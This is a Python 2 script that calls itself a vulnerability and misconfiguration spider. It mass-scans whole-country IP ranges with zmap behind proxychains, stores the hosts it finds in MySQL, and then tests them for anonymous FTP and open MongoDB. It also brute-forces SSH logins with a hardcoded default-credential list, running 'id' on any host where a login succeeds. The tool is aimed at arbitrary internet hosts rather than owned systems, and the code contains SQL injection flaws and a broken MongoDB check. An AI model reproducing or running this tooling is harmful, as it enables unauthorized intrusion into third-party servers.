#!/usr/bin/env python
# -*- coding: utf-8 -*-

########################################################################
## Python spider for some vulnerabilities and misconfigurations check ##
########################################################################

##Importing libs
import sys, os, socket, paramiko, threading, time, subprocess
import httplib
import re
import MySQLdb
from ftplib import FTP
from subprocess import call

##Configuration parameters
#MySQL DB Connection
db_host = 'localhost'
db_user = 'test'
db_pass = 'test'
db_database = 'test'

#Options
option = sys.argv[1]

try:
	option2 = sys.argv[2]
except IndexError:
	option2 = None

try:
	option3 = sys.argv[3]
except IndexError:
	option3 = None




##Creating classes

#db_init #Creating tables
class mysql_db_init:
	def __init__(self, db_host, db_user, db_pass, db_database):
		self.db_host = db_host
		self.db_user = db_user
		self.db_pass = db_pass
		self.db_database = db_database

		db_connect = MySQLdb.connect(host=self.db_host,
									 user=self.db_user,
									 passwd=self.db_pass,
									 db=self.db_database)
		db_cur = db_connect.cursor()
		sql_query = '''CREATE TABLE IF NOT EXISTS `test_scan` (
  						`id` int(12) NOT NULL AUTO_INCREMENT,
  						`host` varchar(24) NOT NULL,
  						`port` int(12) NOT NULL,
  						`banner` text NOT NULL,
  						`date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  						PRIMARY KEY (`id`),
  						UNIQUE KEY `idx_name` (`host`,`port`)
						) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
       				'''
		db_cur.execute(sql_query)
		db_connect.close()
		print "Table 'test_scan' was successfully created!"

		f = open("words.txt", "w")
		f.write("root:root\n")
		f.write("root:123456\n")
		f.write("test:test\n")
		f.write("monitor:monitor\n")
		f.write("admin:admin\n")
		f.write("ftpuser:ftpuser\n")
		f.write("ftp:ftp\n")
		f.write("root:qwerty\n")
		f.write("zabbix:zabbix")
		f.close()
		print ("File 'words.txt' with user:pass was created!")


#export #Sorting data by port and exporting into file
class mysql_db_export:
	def __init__(self, option2, option3, db_host, db_user, db_pass, db_database):
		self.db_host = db_host
		self.db_user = db_user
		self.db_pass = db_pass
		self.db_database = db_database

		self.option2 = option2
		self.option3 = option3

		db_connect = MySQLdb.connect(host=self.db_host,
									 user=self.db_user,
									 passwd=self.db_pass,
									 db=self.db_database)
		db_cur = db_connect.cursor()
		db_cur.execute("SELECT * FROM test_scan WHERE port = '%s'" % (self.option2))
		f = open(self.option3, "w")
		for row in db_cur.fetchall():
			f.write(row[1]+":"+str(row[2])+" | "+row[3]+"\n")
		db_connect.close()
		f.close()
		print "Results were successfully exported into "+self.option3+" !"


#scan #Scanning execution with zmap and proxychains
class zmap_scan:
	def __init__(self, option, option2, option3, db_host, db_user, db_pass, db_database):
		self.option = option
		self.option2 = option2
		self.option3 = option3
		port = str(self.option3)
		read_hosts = open(self.option2, "r")
		zmap_loc = os.popen("which zmap").read().rstrip()
		proxychains_loc = os.popen("which proxychains").read().rstrip()
		#option_results = open("scaned.txt", "w")

		self.db_host = db_host
		self.db_user = db_user
		self.db_pass = db_pass
		self.db_database = db_database
		db_connect = MySQLdb.connect(host=self.db_host,
									 user=self.db_user,
									 passwd=self.db_pass,
									 db=self.db_database)
		db_cur = db_connect.cursor()

		for ip in read_hosts:
			command = proxychains_loc+" "+zmap_loc+" -i eth0 -p "+port+" " +ip.rstrip()+" -o -"
			#print command
			run = os.popen(command).read().split("saddr\n", 1)[1]
			#print "[host] "+run
			for line in (run.splitlines()):
				#print "[host] "+line
				
				db_cur.execute("INSERT INTO test_scan (host, port, banner) VALUES ('%s', '%s', '')" % (line, port))
				
			#option_results.write(run+"\r")

		#option_results.close()
		db_connect.close()
		read_hosts.close()


#ip_list #Parsing list of IPs blocks for scanning (i.e.: ru, by, com etc)
class get_ip_blocks:
	def __init__(self, option, option2):
		self.option2 = option2
		command = "wget http://www.ipdeny.com/ipblocks/data/aggregated/"+option2+"-aggregated.zone -O ip_list_"+option2+".txt"
		run = os.system(command)
		print "IP list was downloaded!"


#check #Executing checks for Anon FTP, MongoDB without password, SSH weak passwords
class execute_checks:
	def __init__(self, option2, db_host, db_user, db_pass, db_database):

		self.db_host = db_host
		self.db_user = db_user
		self.db_pass = db_pass
		self.db_database = db_database

		self.option2 = option2

		db_connect = MySQLdb.connect(host=self.db_host,
									 user=self.db_user,
									 passwd=self.db_pass,
									 db=self.db_database)
		db_cur = db_connect.cursor()
			
		if self.option2 == 'ftp':
			port = '21'
			service = 'ftp'
			db_cur.execute("SELECT host FROM test_scan WHERE port = '%s'" % (port))
			results = db_cur.fetchall()
			for host in results:
				try:
					ftp = FTP(host[0], timeout=5)
					if ftp: 
						banner = "success"
					db_cur.execute("UPDATE test_scan SET banner = '%s' WHERE host = '%s' AND port = '21'" % (banner, host[0]))
				except KeyboardInterrupt:
					print "\nYou pressed CTRL+C, proccess closed!"
					sys.exit()
				except:
					banner = "fail"
					db_cur.execute("UPDATE test_scan SET banner = '%s' WHERE host = '%s' AND port = '21'" % (banner, host[0]))
					pass
			
			db_connect.close()



		elif self.option2 == 'ssh':
			port = '22'
			service = 'ssh'

			db_cur.execute("SELECT host FROM test_scan WHERE port = '%s'" % (port))
			results = db_cur.fetchall()
			for host in results:
				f = open("words.txt", "r")
				def attempt(host,UserName,Password):
					ssh = paramiko.SSHClient()
					ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
					try:
						ssh.connect(host, port=22, username=UserName, password=Password)
						command = 'id'
						(stdin, stdout, stderr) = ssh.exec_command(command)
						Data = stdout.readlines()
					except paramiko.AuthenticationException:
						banner = "fail"
						db_cur.execute("UPDATE test_scan SET banner = '%s' WHERE host = '%s' AND port = '22'" % (banner, host))
					else:
						banner = "success"
						db_cur.execute("UPDATE test_scan SET banner = '%s' WHERE host = '%s' AND port = '22'" % (banner, host))
						ssh.close()
				for line in f.readlines():
					username, password = line.strip().split(":")
					t = threading.Thread(target=attempt, args=(host[0],username,password))
					t.start()
					time.sleep(0.3)
					#f.close()
					#sys.exit(0)

			db_connect.close()




		elif self.option2 == 'mongo':
			port = '27017'
			service = 'mongodb'
			db_cur.execute("SELECT host FROM test_scan WHERE port = '%s'" % (port))
			results = db_cur.fetchall()
			for host in results:
				try:
					client = MongoClient('mongodb://'+host+':27017/', serverSelectionTimeoutMS=5)
					databases = client.database_names()
					databases = "success"
					db_cur.execute("UPDATE test_scan SET banner = '%s' WHERE host = '%s' AND port = '27017'" % (databases, host))
				except:
					databases = "fail"
					db_cur.execute("UPDATE test_scan SET banner = '%s' WHERE host = '%s' AND port = '27017'" % (databases, host))
				client.close()
			db_connect.close()






#Script menu & options
if len(sys.argv) == 4 and option == "export":
	mysql_db_export(option2, option3, db_host, db_user, db_pass, db_database)

elif len(sys.argv) >= 2 and option == "db_init":
	mysql_db_init(db_host, db_user, db_pass, db_database)

elif len(sys.argv) == 4 and option == "scan":
	zmap_scan(option, option2, option3, db_host, db_user, db_pass, db_database)

elif len(sys.argv) <= 3 and option == "ip_list":
	get_ip_blocks(option, option2)

elif len(sys.argv) == 3 and option == "check":
	execute_checks(option2, db_host, db_user, db_pass, db_database)
